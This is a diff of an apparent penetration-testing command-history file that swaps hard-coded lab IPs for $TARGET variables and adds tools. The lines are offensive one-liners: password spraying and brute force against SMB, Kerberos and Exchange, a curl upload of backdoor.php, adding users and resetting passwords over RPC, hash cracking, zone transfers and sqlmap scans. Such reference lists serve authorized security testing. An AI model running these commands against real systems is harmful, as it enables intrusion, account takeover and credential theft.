@@ -168,9 +168,8 @@ cme smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
 cme smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
 enum4linux-ng -A -u "$DOMAIN"/"$USER" -p "$PASSWORD" "$DC_HOST"
 enum4linux-ng -A "$TARGET"
-nmap -sS -p 3268,3269 192.168.56.0/24
-nmap -sC -sV -p 139,445,80,21 192.168.56.201
-nmap -Pn -v -sS -F 192.168.56.0/24
+nmap -sS -p 3268,3269 "$TARGET"
+nmap -sC -sV -p 139,445,80,21 "$TARGET"
 curl "$TARGET" --upload-file backdoor.php -v
 net rpc password 'targetuser' 'somenewpassword123' -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
 net rpc user add 'targetuser' "$PASSWORD" -U "$DOMAIN"/"$USER"%"$PASSWORD" -S "$DC_HOST"
@@ -188,10 +187,12 @@ ruler -k -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -e "j.doe@example.com" --verbose
 ruler -k -d "$DOMAIN" brute --users owa-valid-users.txt --passwords passwords.txt --delay 35 --attempts 3 --verbose | tee -a spray-results.txt
 oaburl.py "$DOMAIN"/"$USER":"$PASSWORD"@"mx.example.com" -e "existent.email@example.com"
 cypheroth -u neo4j -p exegol4thewin -d "$DOMAIN"
-nmap -sS -n --open -p 88 192.168.56.0/24
+nmap -sS -n --open -p 88 "$TARGET"
 windapsearch --dc "$DC_HOST" --module metadata
 windapsearch --dc "$DC_HOST" --module users
 nmap --script broadcast-dhcp-discover
+nmap -Pn -v -sS -F "$TARGET"
+dig axfr "$DOMAIN" @"$TARGET"
 SimplyEmail -all -e cybersyndicates.com
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
@@ -343,9 +344,12 @@ kerbrute passwordspray -d "$DOMAIN" domain_users.txt Password123
 kerbrute bruteuser -d "$DOMAIN" passwords.lst thoffman
 tls-scanner -connect "$TARGET":443
 gowitness nmap -f nmap.xml --open --service-contains http --delay 5 --timeout 5
-goshs -b "goshs":"exegol4thewin" --ssl --self-signed -p 8000 -d /workspace
-goshs -b "goshs":"exegol4thewin" --ssl --self-signed --read-only -p 8001 -d /opt/resources
-goshs -b "goshs":"exegol4thewin" --ssl --self-signed --read-only -p 8002 -d /my-ressources
+goshs -b "goshs":"exegol4thewin" --ssl --self-signed -p 8001 -d /workspace
+goshs -b "goshs":"exegol4thewin" --ssl --self-signed --read-only -p 8002 -d /opt/resources
+updog --ssl --port 9090 --password "exegol4thewin" --directory /opt/resources
 sslyze --sslv2 --sslv3 --tlsv1 --tlsv1_1 --tlsv1_2 --tlsv1_3 --heartbleed --robot --openssl_ccs --compression --reneg --certinfo --elliptic_curves --early_data --fallback --json_out=sslyze.json $TARGET
 findDelegation.py -dc-ip "$DC_IP" "$DOMAIN"/"$USER":"$PASSWORD"
+fierce --domain "$DOMAIN" --dns-servers "$TARGET"
+sqlmap --forms --batch -u "http://somewebsite/"
+ftp-server -u 'ftpserver' -P 'exegol4thewin' -p 2121
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
